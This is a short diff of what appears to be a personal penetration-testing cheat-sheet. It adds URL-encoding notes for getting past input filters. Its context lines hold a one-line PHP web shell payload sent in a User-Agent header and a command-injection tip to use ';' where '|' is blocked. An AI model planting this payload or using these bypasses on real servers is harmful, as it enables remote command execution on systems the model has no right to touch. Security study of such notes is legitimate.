@@ -31,6 +31,9 @@ User-Agent: <?php echo system($_GET['cmd']); ?>
 
 ======= FILTERS =======
 Easy: case sensitive
+URL Encondes:
+%20: " "
+%2e: "."
 
 ======= COMMAND INJECTION ==========
 instead of using | to next cmd, try ;
